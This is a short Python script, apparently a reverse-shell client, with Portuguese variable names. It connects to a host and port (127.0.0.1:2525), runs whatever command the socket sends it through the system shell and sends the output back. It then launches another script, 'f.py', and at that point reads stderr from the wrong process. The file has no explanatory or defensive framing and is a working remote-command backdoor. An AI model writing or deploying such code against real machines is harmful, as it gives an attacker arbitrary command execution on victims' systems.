import socket
import subprocess

host = '127.0.0.1'
port = 2525

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

msg = s.recv(1024)
executar = subprocess.Popen(msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
resposta = executar.stdout.read() + executar.stderr.read()

if len(resposta) > 0:
    s.send(resposta)


a = subprocess.Popen("python f.py", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
resposta = a.stdout.read() + executar.stderr.read()
